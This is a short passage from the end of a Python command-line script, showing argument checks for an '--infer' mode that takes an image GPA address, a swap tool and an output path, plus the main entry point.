            p.error("--infer requires --image-gpa 0x...")
        infer(args.image_gpa, args.swap_tool, Path(args.out))
    else:
        p.print_help()


if __name__ == "__main__":
    main()
